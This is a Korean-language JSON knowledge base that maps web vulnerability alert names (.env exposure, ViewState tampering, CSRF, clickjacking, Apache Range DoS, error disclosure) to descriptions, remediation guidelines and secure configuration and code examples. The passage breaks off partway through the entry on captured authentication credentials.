{
  ".env Information Leak": {
    "translated": "환경설정 파일(.env) 노출 – 민감 정보가 외부에 유출될 수 있음",
    "description": "운영 환경 설정을 담고 있는 .env 파일이 웹 서버를 통해 외부에 노출되어 민감한 정보(데이터베이스 자격 증명, API 키 등)가 유출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**.env 파일 웹 접근 차단:** 웹 서버 설정(예: Apache의 .htaccess, Nginx 설정)을 통해 .env 파일에 대한 직접적인 접근을 명시적으로 거부합니다.",
      "**민감 정보는 환경 변수로 관리:** .env 파일 대신 운영 환경에서는 실제 시스템 환경 변수를 사용하여 민감 정보를 로드하도록 애플리케이션을 구성합니다.",
      "**.env 파일은 Git 저장소에 포함하지 않기:** .gitignore 파일에 .env를 추가하여 형상 관리 시스템에 커밋되지 않도록 합니다."
    ],
    "example_nginx": "# Nginx 설정 예시\nlocation ~ /\\.env {\n    deny all;\n}",
    "example_apache": "# Apache .htaccess 예시\n<Files \".env\">\n    Order allow,deny\n    Deny from all\n</Files>"
  },
  ".htaccess Information Leak": {
    "translated": ".htaccess 설정 파일 노출 – 접근제어 규칙 등이 노출될 수 있음",
    "description": ".htaccess 파일이 웹 서버를 통해 노출되어 서버 설정, 파일 및 디렉토리 접근 제어 정보 등 민감한 서버 구성 정보가 유출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**.htaccess 파일 웹 접근 차단:** 웹 서버 설정을 통해 .htaccess 파일에 대한 직접적인 접근을 명시적으로 거부합니다.",
      "**.htaccess 대신 메인 서버 설정 사용:** 가능한 경우 .htaccess 대신 Apache의 httpd.conf 또는 Nginx의 nginx.conf와 같은 메인 서버 설정 파일에서 보안 구성을 직접 관리하여 .htaccess 파일 사용 자체를 최소화합니다.",
      "**필수적인 정보만 포함:** .htaccess 파일을 사용해야 한다면, 최소한의 필수적인 정보만 포함하고 민감한 정보는 담지 않습니다."
    ],
    "example_nginx": "# Nginx 설정 예시\nlocation ~ /\\.ht {\n    deny all;\n}",
    "example_apache": "# Apache httpd.conf 또는 가상 호스트 설정 예시\n<Files \".ht*\">\n    Order allow,deny\n    Deny from all\n    Satisfy All\n</Files>"
  },
  "ASP.NET ViewState Disclosure": {
    "translated": "ASP.NET ViewState 데이터 노출 – 인코딩된 상태 정보가 유출될 수 있음",
    "description": "ASP.NET의 ViewState 데이터가 웹 페이지 소스 코드에 포함되어 클라이언트에 전송될 때, 민감한 정보가 인코딩(암호화 아님)되어 노출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**ViewState에 민감 정보 저장 금지:** 절대로 ViewState에 개인 식별 정보(PII), 자격 증명, 세션 토큰 등 민감한 정보를 직접 저장하지 않습니다.",
      "**ViewState 암호화 및 무결성 보호 활성화:** MachineKey를 사용하여 ViewState의 암호화(Encryption)와 무결성(Integrity) 보호를 활성화하여 변조 및 정보 유출을 방지합니다.",
      "**ViewState 최소화:** ViewState의 크기를 줄여 클라이언트 전송량을 줄이고, 필요한 최소한의 데이터만 저장하도록 합니다.",
      "**ViewState 대신 다른 상태 관리 기술 고려:** 세션, 데이터베이스, 캐시 등 서버 측 상태 관리 기술을 사용하여 민감 정보를 관리하는 것을 고려합니다."
    ],
    "example_aspnet_web_config": "<system.web>\n    <machineKey validationKey=\"AutoGenerate,IsolateApps\" decryptionKey=\"AutoGenerate,IsolateApps\"\n                validation=\"SHA1\" decryption=\"Auto\" />\n</system.web>\n\n<%@ Page EnableViewState=\"false\" %>\n\n<asp:GridView ID=\"GridView1\" runat=\"server\" EnableViewState=\"false\">\n</asp:GridView>"
  },
  "ASP.NET ViewState Integrity": {
    "translated": "ASP.NET ViewState 변조 가능 – 웹 페이지 상태 정보가 조작될 수 있음",
    "description": "ASP.NET ViewState에 MAC(Message Authentication Code) 서명이 없거나 제대로 구성되지 않아 공격자가 ViewState 데이터를 변조할 수 있는 취약점입니다. 이는 임의 코드 실행이나 정보 유출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**MachineKey 설정:** `web.config` 파일에 `machineKey` 요소를 적절히 설정하여 ViewState의 무결성을 보호해야 합니다. `validationKey`와 `validation` 속성을 사용하여 MAC 서명을 활성화하고 강력한 알고리즘을 사용합니다.",
      "**AutoGenerate 사용 주의:** `AutoGenerate`를 사용하는 경우, 웹 팜 환경에서는 동일한 `machineKey`를 모든 서버에 명시적으로 설정해야 합니다. 그렇지 않으면 ViewState 유효성 검사에 실패할 수 있습니다.",
      "**정기적인 키 변경:** `machineKey`의 키는 주기적으로 변경하는 것이 좋습니다."
    ],
    "example_aspnet_web_config": "<system.web>\n    <machineKey validationKey=\"[실제 운영 환경에 맞는 강력하고 고유한 키]\" decryptionKey=\"[실제 운영 환경에 맞는 강력하고 고유한 키]\"\n                validation=\"HMACSHA256\" decryption=\"AES\" />\n</system.web>"
  },
  "Absence of Anti-CSRF Tokens": {
    "translated": "CSRF 방지 토큰 없음 – 비정상적인 요청에 취약할 수 있음",
    "description": "웹 애플리케이션이 CSRF(Cross-Site Request Forgery) 공격으로부터 보호하기 위한 Anti-CSRF 토큰을 사용하지 않는 취약점입니다. 공격자가 사용자를 속여 의도하지 않은 요청을 실행하게 만들 수 있습니다.",
    "solution_guidelines": [
      "**Anti-CSRF 토큰 사용:** 상태를 변경하는 모든 요청(예: POST, PUT, DELETE)에 예측 불가능한 Anti-CSRF 토큰을 포함시킵니다.",
      "**토큰의 유효성 검사:** 서버는 요청을 처리하기 전에 전송된 토큰과 서버 측에 저장된 토큰(예: 세션에 저장)을 비교하여 유효성을 검사합니다.",
      "**토큰 생성:** 토큰은 각 사용자 세션에 고유하게 생성되며, 예측 불가능해야 합니다.",
      "**SameSite 쿠키 속성 활용:** `SameSite=Lax` 또는 `SameSite=Strict` 속성을 사용하여 쿠키를 설정하여 CSRF 공격을 완화할 수 있습니다. 하지만 이는 완전한 방어책이 아니므로 Anti-CSRF 토큰과 함께 사용하는 것이 좋습니다."
    ],
    "example_java_spring": "// Spring Security CSRF 보호 활성화 (기본적으로 활성화되어 있음)\n// HTML 폼에 토큰 추가\n<form action=\"/submit\" method=\"post\">\n    <input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\"/>\n    <button type=\"submit\">Submit</button>\n</form>\n\n// AJAX 요청 시 헤더에 토큰 추가 (JavaScript)\n// const csrfToken = document.querySelector('meta[name=\"_csrf\"]').getAttribute('content');\n// const csrfHeader = document.querySelector('meta[name=\"_csrf_header\"]').getAttribute('content');\n//\n// fetch('/api/data', {\n//     method: 'POST',\n//     headers: {\n//         'Content-Type': 'application/json',\n//         [csrfHeader]: csrfToken\n//     },\n//     body: JSON.stringify({ key: 'value' })\n// });",
    "example_python_django": "# Django CSRF 보호 활성화 (기본적으로 활성화되어 있음)\n# HTML 폼에 토큰 추가\n<form method=\"post\">\n    {% csrf_token %}\n    <button type=\"submit\">Submit</button>\n</form>\n\n# AJAX 요청 시 (JavaScript)\n// function getCookie(name) {\n//     let cookieValue = null;\n//     if (document.cookie && document.cookie !== '') {\n//         const cookies = document.cookie.split(';');\n//         for (let i = 0; i < cookies.length; i++) {\n//             const cookie = cookies[i].trim();\n//             if (cookie.substring(0, name.length + 1) === (name + '=')) {\n//                 cookieValue = decodeURIComponent(cookie.substring(name.length + 1));\n//                 break;\n//             }\n//         }\n//     }\n//     return cookieValue;\n// }\n//\n// fetch('/api/data', {\n//     method: 'POST',\n//     headers: {\n//         'Content-Type': 'application/json',\n//         'X-CSRFToken': getCookie('csrftoken')\n//     },\n//     body: JSON.stringify({ key: 'value' })\n// });"
  },
  "Access Control Issue - Improper Authentication": {
    "translated": "인증 부실로 인한 접근 제어 문제 – 사용자 식별 과정이 취약하여 우회될 수 있음",
    "description": "사용자가 올바르게 식별되지 않거나, 인증 절차에 결함이 있어 공격자가 유효한 사용자로 가장하거나 비정상적인 방법으로 시스템에 접근할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**강력한 인증 메커니즘 사용:** 안전한 비밀번호 정책(길이, 복잡성, 만료), 다단계 인증(MFA) 도입을 고려합니다.",
      "**안전한 비밀번호 저장:** 비밀번호는 단방향 해싱(예: PBKDF2, bcrypt, scrypt, Argon2)과 솔트(salt)를 사용하여 저장하고, 절대로 평문으로 저장하지 않습니다.",
      "**세션 관리 보안:** 세션 ID는 예측 불가능해야 하며, HTTPS를 통해서만 전송되고, 적절한 만료 시간을 설정해야 합니다. 세션 하이재킹 방지를 위해 세션 ID는 쿠키에 HttpOnly와 Secure 플래그를 설정하여 저장합니다.",
      "**계정 잠금 및 속도 제한:** 무차별 대입 공격(Brute Force Attack)을 방지하기 위해 일정 횟수 이상 로그인 실패 시 계정을 잠그거나 로그인 시도 속도를 제한합니다.",
      "**로그인 로직 강화:** 사용자명 열거(username enumeration)를 방지하기 위해 로그인 실패 시 일반적인 오류 메시지를 제공하고, 성공/실패 여부를 쉽게 추측할 수 없도록 합니다.",
      "**모든 인증 경로 보안:** 로그인 폼, API 인증, OAuth/SAML 연동 등 모든 인증 경로를 철저히 검토하고 보안을 강화합니다."
    ]
  },
  "Access Control Issue - Improper Authorization": {
    "translated": "권한 부여 오류로 인한 접근 제어 문제 – 인가되지 않은 자원에 접근할 수 있음",
    "description": "인증된 사용자가 접근 권한이 없는 자원이나 기능에 접근할 수 있는 취약점입니다. 수평적/수직적 권한 상승으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**최소 권한 원칙 (Principle of Least Privilege) 적용:** 사용자에게 필요한 최소한의 권한만 부여하고, 기본적으로 모든 접근을 거부합니다.",
      "**강력한 서버 측 권한 검사:** 모든 자원(파일, 데이터베이스 레코드, API 엔드포인트) 및 기능에 대한 접근 권한을 서버 측에서 철저히 검사합니다. 클라이언트 측 검사는 우회될 수 있으므로 신뢰해서는 안 됩니다.",
      "**역할 기반 접근 제어 (RBAC) 또는 속성 기반 접근 제어 (ABAC) 구현:** 사용자의 역할 또는 속성에 따라 접근 권한을 체계적으로 관리합니다.",
      "**모든 파라미터 검사:** 사용자 ID, 문서 ID 등 리소스 식별에 사용되는 모든 파라미터가 현재 사용자의 권한 내에서 유효한지 검사합니다.",
      "**사용자 데이터 격리:** 다른 사용자의 데이터에 접근할 수 없도록 데이터베이스 쿼리나 파일 시스템 접근 시 사용자/소유자 ID를 포함하여 필터링합니다.",
      "**예외 처리:** 권한 없는 접근 시에는 일반적인 '접근 거부' 메시지를 제공하고, 민감한 정보를 노출하지 않도록 합니다."
    ],
    "example_java_spring_security": "// Spring Security 메소드 보안 (권한 검사 예시)\n@Service\npublic class UserService {\n\n    @PreAuthorize(\"hasRole('ADMIN')\") // ADMIN 역할만 접근 가능\n    public void deleteUser(Long userId) {\n        // ... 사용자 삭제 로직\n    }\n\n    @PreAuthorize(\"#userId == principal.id or hasRole('ADMIN')\") // 본인 또는 ADMIN만 접근 가능\n    public User getUserProfile(Long userId) {\n        // ... 사용자 프로필 조회 로직\n    }\n}",
    "example_python_flask": "# Flask 데코레이터를 이용한 권한 검사 예시\nfrom functools import wraps\nfrom flask import abort, g\n\ndef requires_role(role_name):\n    def decorator(f):\n        @wraps(f)\n        def decorated_function(*args, **kwargs):\n            if not hasattr(g, 'user') or g.user.role != role_name:\n                abort(403) # Forbidden\n            return f(*args, **kwargs)\n        return decorated_function\n    return decorator\n\n@app.route('/admin_dashboard')\n@requires_role('admin')\ndef admin_dashboard():\n    return \"Welcome, Admin!\"\n\n@app.route('/user_profile/<int:user_id>')\ndef user_profile(user_id):\n    if user_id != g.user.id and g.user.role != 'admin':\n        abort(403)\n    return f\"User profile for {user_id}\""
  },
  "Advanced SQL Injection": {
    "translated": "고급 SQL 인젝션 – 데이터베이스를 심층적으로 공격할 수 있음",
    "description": "일반적인 SQL Injection 외에 더 복잡한 형태의 공격(예: Blind SQL Injection, Time-based Blind SQL Injection, Out-of-band SQL Injection)을 의미합니다. 데이터베이스 오류 메시지나 응답의 변화 없이 시간 지연 또는 외부 통신을 통해 정보를 추출하는 방식입니다.",
    "solution_guidelines": [
      "**매개변수화된 쿼리 (Parameterized Queries) 또는 준비된 문 (Prepared Statements) 사용:** SQL Injection 방지의 가장 효과적인 방법입니다. 사용자 입력을 쿼리 문자열에 직접 연결하지 않고, 데이터베이스 드라이버가 입력값을 별도로 처리하도록 합니다.",
      "**저장 프로시저 (Stored Procedures) 사용:** 모든 입력이 매개변수화되는 경우에만 SQL Injection 방지에 도움이 됩니다. 동적 SQL을 사용하는 저장 프로시저는 여전히 취약할 수 있습니다.",
      "**입력값 유효성 검사 (Input Validation):** 사용자 입력값을 서버 측에서 철저히 검사하여 예상되는 형식과 범위 내에 있는지 확인합니다. 화이트리스트 방식의 유효성 검사를 선호합니다.",
      "**최소 권한 원칙 (Principle of Least Privilege):** 데이터베이스 연결에 사용되는 계정에는 필요한 최소한의 권한만 부여합니다. (예: SELECT 권한만 부여하고 DELETE, DROP 등의 권한은 제한)",
      "**오류 메시지 일반화:** 데이터베이스 오류 메시지가 사용자에게 직접 노출되지 않도록 일반적인 오류 메시지를 제공하고, 자세한 오류는 서버 로그에만 기록합니다.",
      "**웹 애플리케이션 방화벽 (WAF) 사용:** WAF는 추가적인 방어 계층을 제공할 수 있지만, 이는 근본적인 해결책이 아니므로 코드 레벨에서의 방어가 필수적입니다."
    ],
    "example_java_jdbc": "import java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class AdvancedSqlInjectionExample {\n\n    // 안전한 방법: Prepared Statements 사용\n    public ResultSet getUserData(Connection conn, String username, String password) throws SQLException {\n        String sql = \"SELECT * FROM users WHERE username = ? AND password = ?\";\n        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setString(1, username);\n            pstmt.setString(2, password); // 비밀번호는 해싱되어 저장되어야 하며, 비교 시에도 해싱된 값을 사용해야 합니다.\n            return pstmt.executeQuery();\n        }\n    }\n\n    // 안전한 방법: 숫자 입력 시\n    public ResultSet getProductById(Connection conn, int productId) throws SQLException {\n        String sql = \"SELECT * FROM products WHERE id = ?\";\n        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setInt(1, productId); // int 타입으로 설정\n            return pstmt.executeQuery();\n        }\n    }\n}",
    "example_python_psycopg2": "import psycopg2\n\ndef get_user_data(db_conn, username, password):\n    cursor = db_conn.cursor()\n    try:\n        # 안전한 방법: 매개변수화된 쿼리 사용\n        cursor.execute(\"SELECT * FROM users WHERE username = %s AND password = %s\", (username, password))\n        return cursor.fetchall()\n    finally:\n        cursor.close()\n\ndef get_product_by_id(db_conn, product_id):\n    cursor = db_conn.cursor()\n    try:\n        cursor.execute(\"SELECT * FROM products WHERE id = %s\", (product_id,))\n        return cursor.fetchall()\n    finally:\n        cursor.close()"
  },
  "Anti-CSRF Tokens Check": {
    "translated": "CSRF 방지 토큰 확인 – 비정상적인 요청 방어 여부 점검",
    "description": "애플리케이션이 Anti-CSRF 토큰을 올바르게 생성하고 전송하지만, 서버 측에서 토큰의 유효성을 제대로 검사하지 않거나 누락하는 취약점입니다.",
    "solution_guidelines": [
      "**모든 상태 변경 요청에 대한 토큰 유효성 검사 필수:** GET 요청을 제외한 POST, PUT, DELETE 등 상태를 변경하는 모든 요청에 대해 서버 측에서 전송된 Anti-CSRF 토큰과 세션에 저장된 토큰이 일치하는지 확인해야 합니다.",
      "**토큰 유효성 검사 로직 감사:** CSRF 보호를 위한 미들웨어, 필터, 인터셉터 또는 수동으로 구현된 토큰 검사 로직이 올바르게 작동하는지 정기적으로 검토하고 테스트합니다.",
      "**실패 시 적절한 응답:** 토큰 검증에 실패할 경우, '403 Forbidden'과 같은 적절한 HTTP 상태 코드를 반환하고, 민감한 정보를 노출하지 않는 일반적인 오류 메시지를 제공합니다."
    ],
    "example_java_spring_security": "// Spring Security는 기본적으로 CSRF 토큰 검사를 활성화합니다.\n// 특별히 비활성화하거나 커스터마이징하지 않는 한 이 부분은 자동으로 처리됩니다.\n// 만약 특정 엔드포인트에서 CSRF 보호를 비활성화했다면 (예: @CrossOrigin, .csrf().disable()),\n// 해당 엔드포인트에 대한 보안 위험을 인지하고 다른 보안 대책을 강구해야 합니다.\n\n// WebSecurityConfig.java (일반적인 Spring Security 설정)\n@Configuration\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http\n            .csrf() // CSRF 보호 활성화 (기본값)\n                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()) // 예시: 쿠키에 토큰 저장\n            .and()\n            // ... 다른 보안 설정\n            .authorizeRequests()\n            .antMatchers(\"/public/**\").permitAll()\n            .anyRequest().authenticated();\n    }\n}",
    "example_python_django": "# Django는 CSRF 미들웨어를 통해 기본적으로 CSRF 토큰 검사를 수행합니다.\n# settings.py에 'django.middleware.csrf.CsrfViewMiddleware'가 포함되어 있는지 확인합니다.\n\n# settings.py\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware', # CSRF 미들웨어\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\n# 뷰에서 특정 요청에 대해 CSRF 검사를 건너뛰려면 @csrf_exempt 데코레이터를 사용하지만,\n# 이는 보안상 매우 신중하게 사용해야 합니다.\n# from django.views.decorators.csrf import csrf_exempt\n#\n# @csrf_exempt\n# def my_unprotected_view(request):\n#     # 이 뷰는 CSRF 보호를 받지 않습니다.\n#     pass"
  },
  "Anti-clickjacking Header": {
    "translated": "클릭재킹 방지 헤더 – 악성 페이지 내 삽입되어 오클릭 유발 방지",
    "description": "클릭재킹(Clickjacking) 공격을 방지하기 위한 `X-Frame-Options` 또는 `Content-Security-Policy: frame-ancestors` HTTP 헤더가 설정되지 않은 취약점입니다. 공격자는 악의적인 웹사이트 내에 대상 웹사이트를 iframe으로 포함시켜 사용자를 속여 클릭을 유도할 수 있습니다.",
    "solution_guidelines": [
      "**`X-Frame-Options` 헤더 설정:** 웹 서버 또는 애플리케이션에서 `X-Frame-Options` HTTP 응답 헤더를 설정하여 웹 페이지가 `<frame>`, `<iframe>`, `<embed>`, `<object>` 내에서 렌더링되는 방식을 제어합니다.",
      "**`Content-Security-Policy: frame-ancestors` 사용:** `X-Frame-Options`보다 더 유연하고 강력한 `Content-Security-Policy`의 `frame-ancestors` 지시어를 사용하여 프레임 삽입을 허용하는 도메인을 명시적으로 지정합니다. 최신 브라우저에서는 CSP `frame-ancestors`를 우선적으로 사용합니다.",
      "**두 헤더 동시 사용 금지:** `X-Frame-Options`와 `Content-Security-Policy: frame-ancestors`를 동시에 사용하면 일부 브라우저에서 예상치 못한 동작이 발생할 수 있으므로, CSP `frame-ancestors`를 사용하는 것이 좋습니다."
    ],
    "example_nginx": "# Nginx 설정 예시 (nginx.conf 또는 site-conf 파일)\n# X-Frame-Options 헤더\nadd_header X-Frame-Options SAMEORIGIN; # 동일 출처에서만 허용\n# add_header X-Frame-Options DENY;        # 모든 프레임 삽입 금지\n\n# Content-Security-Policy (CSP) frame-ancestors 헤더 (더 강력)\n# add_header Content-Security-Policy \"frame-ancestors 'self' example.com;\"; # 자신 및 example.com만 허용\n# add_header Content-Security-Policy \"frame-ancestors 'self';\"; # 자신만 허용 (DENY와 유사)\n# add_header Content-Security-Policy \"frame-ancestors 'none';\"; # 모든 프레임 삽입 금지 (DENY와 동일)",
    "example_apache": "# Apache 설정 예시 (httpd.conf 또는 .htaccess 파일)\n# X-Frame-Options 헤더\nHeader always append X-Frame-Options SAMEORIGIN\n# Header always append X-Frame-Options DENY\n\n# Content-Security-Policy (CSP) frame-ancestors 헤더 (더 강력)\n# Header always append Content-Security-Policy \"frame-ancestors 'self' example.com;\"\n# Header always append Content-Security-Policy \"frame-ancestors 'self';\"\n# Header always append Content-Security-Policy \"frame-ancestors 'none';\"",
    "example_express_node": "// Express.js (Node.js) 예시\nconst express = require('express');\nconst helmet = require('helmet'); // 보안 헤더 설정을 위한 미들웨어\n\nconst app = express();\n\n// X-Frame-Options 헤더 설정\napp.use(helmet.frameguard({ action: 'deny' })); // 모든 프레임 삽입 금지\n// app.use(helmet.frameguard({ action: 'sameorigin' })); // 동일 출처에서만 허용\n\n// Content-Security-Policy frame-ancestors 설정 (Helmet을 통해)\n// helmet.contentSecurityPolicy는 여러 지시어를 설정할 수 있습니다.\napp.use(helmet.contentSecurityPolicy({\n    directives: {\n        frameAncestors: [\"'self'\"], // 자신만 허용\n        // frameAncestors: [\"'none'\"], // 모든 프레임 삽입 금지\n        // frameAncestors: [\"'self'\", \"https://trusted.example.com\"], // 자신 및 특정 도메인 허용\n        // ... 다른 CSP 지시어\n    }\n}));\n\n// app.use(helmet()); // Helmet은 기본적으로 X-Frame-Options DENY를 설정합니다.\n// app.use(helmet({\n//  frameguard: {\n//    action: 'deny'\n//  }\n// }));\n// app.use(helmet({\n//  contentSecurityPolicy: {\n//    directives: {\n//      frameAncestors: [\"'self'\"],\n//    },\n//  },\n// }));\n\n// ... 라우터 및 다른 미들웨어"
  },
  "Apache Range Header DoS (CVE-2011-3192)": {
    "translated": "아파치 Range 헤더 서비스 거부 공격 (CVE-2011-3192) – 서버가 다운될 수 있음",
    "description": "Apache 웹 서버의 `Range` 헤더 처리 방식에 존재하는 취약점으로, 공격자가 악의적인 `Range` 헤더를 포함한 요청을 보내면 서버의 CPU 및 메모리를 과도하게 사용하여 서비스 거부(DoS) 상태를 유발할 수 있습니다.",
    "solution_guidelines": [
      "**Apache 버전 업데이트:** 이 취약점은 Apache HTTP Server 2.0.x, 2.2.x, 2.3.x 버전에 영향을 미쳤으며, 최신 버전으로 업데이트하여 패치해야 합니다. (CVE-2011-3192가 해결된 버전으로 업그레이드)",
      "**`mod_reqtimeout` 또는 `mod_evasive` 사용:** 요청 헤더에 대한 시간 제한을 설정하거나, 짧은 시간 내에 비정상적으로 많은 요청을 보내는 클라이언트를 차단하는 모듈을 사용하여 DoS 공격을 완화할 수 있습니다.",
      "**프록시 또는 WAF 사용:** 웹 애플리케이션 방화벽(WAF)이나 리버스 프록시(예: Nginx, Cloudflare)를 Apache 서버 앞에 두어 악의적인 요청을 필터링하고 차단할 수 있습니다."
    ],
    "example_apache_config_mitigation": "# Apache 설정 (mod_reqtimeout 예시)\n# 이 모듈은 요청 헤더를 받는 데 걸리는 시간과 전체 요청을 받는 데 걸리는 시간을 제한합니다.\n# httpd.conf 또는 가상 호스트 설정에 추가\n<IfModule mod_reqtimeout.c>\n    # 헤더가 5초 안에 도착해야 하고, 최소 500바이트/초의 속도를 유지해야 함\n    RequestReadTimeout header=5,minrate=500\n    # 바디가 10초 안에 도착해야 하고, 최소 500바이트/초의 속도를 유지해야 함\n    RequestReadTimeout body=10,minrate=500\n</IfModule>\n\n# mod_evasive (설치 필요) 예시\n# DOSSiteCount 50 # 30초 내에 50번 이상 동일 페이지 요청 시 차단\n# DOSPageCount 20 # 30초 내에 20번 이상 동일 URL 요청 시 차단\n# DOSBlockingPeriod 10 # 차단 시간 10초"
  },
  "Application Error Disclosure": {
    "translated": "애플리케이션 오류 정보 노출 – 상세한 에러 메시지로 인해 내부 정보가 유출될 수 있음",
    "description": "웹 애플리케이션이 오류 발생 시 상세한 스택 트레이스, 데이터베이스 오류 메시지, 내부 시스템 경로 등 민감한 정보를 포함하는 오류 메시지를 사용자에게 직접 노출하는 취약점입니다. 이는 공격자가 시스템 아키텍처, 데이터베이스 스키마, 잠재적인 취약점 등을 파악하는 데 활용될 수 있습니다.",
    "solution_guidelines": [
      "**상세 오류 메시지 숨기기:** 운영 환경에서는 사용자에게 상세한 오류 메시지(예: 스택 트레이스, 데이터베이스 오류, 파일 경로 등)를 직접 노출하지 않고, 일반적이고 사용자 친화적인 오류 페이지(예: '오류가 발생했습니다. 잠시 후 다시 시도해주세요.')를 제공합니다.",
      "**오류 로깅:** 상세한 오류 정보는 서버 측 로그 파일에만 기록하고, 적절한 로깅 레벨과 보안 조치를 적용하여 로그 파일 접근을 제한합니다.",
      "**개발/테스트 환경과 운영 환경 분리:** 개발/테스트 환경에서는 상세 오류 메시지를 활성화하여 디버깅에 활용하되, 운영 환경에서는 반드시 비활성화하도록 설정합니다.",
      "**커스텀 오류 페이지 사용:** 웹 서버(Apache, Nginx) 또는 애플리케이션 프레임워크에서 제공하는 커스텀 오류 페이지 기능을 활용하여 특정 HTTP 상태 코드(예: 404, 500)에 대해 사용자 정의 페이지를 표시합니다."
    ],
    "example_java_spring_boot": "// Spring Boot (application.properties 또는 application.yml)\n# 운영 환경에서 상세 오류 메시지 비활성화\n# application.properties\nserver.error.include-stacktrace=never\nserver.error.include-message=never\nserver.error.whitelabel.enabled=false # 기본 오류 페이지 대신 커스텀 페이지 사용\n\n# application.yml\n# server:\n#   error:\n#     include-stacktrace: never\n#     include-message: never\n#     whitelabel:\n#       enabled: false\n\n// 사용자 정의 오류 페이지 (예: src/main/resources/templates/error.html)\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Error</title>\n</head>\n<body>\n    <h1>Oops! Something went wrong.</h1>\n    <p>We apologize for the inconvenience. Please try again later.</p>\n</body>\n</html>",
    "example_python_django": "# Django (settings.py)\n# DEBUG를 False로 설정하면 자세한 오류 메시지가 사용자에게 노출되지 않습니다.\nDEBUG = False\n\n# ALLOWED_HOSTS 설정 필수\nALLOWED_HOSTS = ['yourdomain.com', 'www.yourdomain.com']\n\n# 사용자 정의 500 에러 핸들러 (views.py)\n# def handler500(request):\n#     return render(request, '500.html', status=500)\n\n# urls.py\n# handler500 = 'your_app.views.handler500'\n\n# templates/500.html\n# <!DOCTYPE html>\n# <html>\n# <head>\n#     <title>Server Error</title>\n# </head>\n# <body>\n#     <h1>An internal server error occurred.</h1>\n#     <p>Please try again later.</p>\n# </body>\n# </html>"
  },
  "Application Error Disclosure via WebSockets": {
    "translated": "웹소켓을 통한 애플리케이션 오류 정보 노출 – 웹소켓 통신 중 상세 에러 메시지가 유출될 수 있음",
    "description": "웹소켓 통신 중 오류가 발생했을 때, 서버가 상세한 오류 메시지(스택 트레이스, 내부 시스템 정보 등)를 웹소켓 메시지를 통해 클라이언트에게 전송하는 취약점입니다. 이는 공격자가 애플리케이션의 내부 구조나 취약점을 파악하는 데 활용될 수 있습니다.",
    "solution_guidelines": [
      "**웹소켓 오류 메시지 일반화:** 웹소켓을 통해 클라이언트에 전송되는 오류 메시지는 일반적이고 추상적인 내용이어야 합니다. 상세한 스택 트레이스나 시스템 경로는 절대로 포함하지 않도록 합니다.",
      "**서버 측 로깅:** 상세한 오류 정보는 웹소켓 서버 측의 보안 로그 파일에만 기록하고, 로그 접근 권한을 엄격하게 관리합니다.",
      "**개발/운영 환경 분리:** 개발 및 테스트 환경에서만 상세 오류 로깅을 활성화하고, 운영 환경에서는 비활성화합니다.",
      "**웹소켓 프레임워크의 오류 처리 설정 검토:** 사용 중인 웹소켓 라이브러리 또는 프레임워크(예: Socket.IO, Spring WebSocket, WebSocket-Node)의 오류 처리 및 메시지 포맷팅 설정을 확인하여 민감 정보가 노출되지 않도록 구성합니다."
    ],
    "example_nodejs_websocket": "// Node.js (ws 라이브러리 예시)\nconst WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        try {\n            // ... 메시지 처리 로직 ...\n            if (message.toString() === 'error_trigger') {\n                throw new Error(\"This is a simulated internal error.\");\n            }\n            ws.send(`Echo: ${message}`);\n        } catch (error) {\n            console.error('WebSocket Error:', error.stack); // 상세 오류는 서버 로그에만 기록\n\n            // 클라이언트에 일반적인 오류 메시지 전송\n            ws.send(JSON.stringify({\n                status: 'error',\n                message: 'An internal server error occurred. Please try again.'\n            }));\n            // 또는\n            // ws.send(\"ERROR: Invalid request.\");\n        }\n    });\n\n    ws.on('error', error => {\n        console.error('WebSocket connection error:', error);\n        // 클라이언트에게는 오류를 직접적으로 보내지 않거나, 연결을 종료\n        ws.terminate();\n    });\n});"
  },
  "Authentication Credentials Captured": {
    "translated": "인증 자격 증명 탈취 – 사용자 로그인 정보(ID/PW)가 가로채질 수 있음",
    "description": "인증 자격 증명(사용자 이름, 비밀번호, 세션 토큰 등)이 네트워크를 통해 평문으로 전송되거나, 클라이언트/서버 측에서 안전하지 않은 방식으로 처리되어 공격자에게 노출될 위험이 있는 취약점입니다.",
    "solution_guidelines": [
      "**HTTPS(TLS/SSL) 사용 강제화:** 모든 인증 및 민감한 데이터 전송은 반드시 HTTPS를 통해서만 이루어져야 합니다. HTTP로의 강제 리다이렉트 및 Strict-Transport-Security (HSTS) 헤더를 적용합니다.",
      "**비밀번호 해싱 및 솔팅:** 비밀번호는 데이터베이스에 저장하기 전에 강력한 단방향 해싱 함수(PBKDF2, bcrypt, scrypt, Argon2)와 고유한 솔트(salt)를 사용하여 저장합니다. 절대로 평문으로 저장하지 않습니다.",
      "**세션 토큰 보안:** 세션 토큰은 예측 불가능하게 생성하고, HttpOnly 및 Secure 플래그가 설정된 쿠키를 통해 전송하며, 적절한 만료 시간을 설정합니다.",
      "**API 키 및 토큰 관리:** API 키, JWT 토큰 등은 안전한 방식으로 생성, 저장, 전송되어야 하며, 불필요하게 클라이언트 측에 노출되지 않도록 합니다.",
      "**자격 증명 노출 방지:** URL 파라미터, HTTP Referer 헤더, 클라이언트 측 스크립트(JavaScript) 등에 민감한 자격 증명이 포함되지 않도록 주의합니다.",
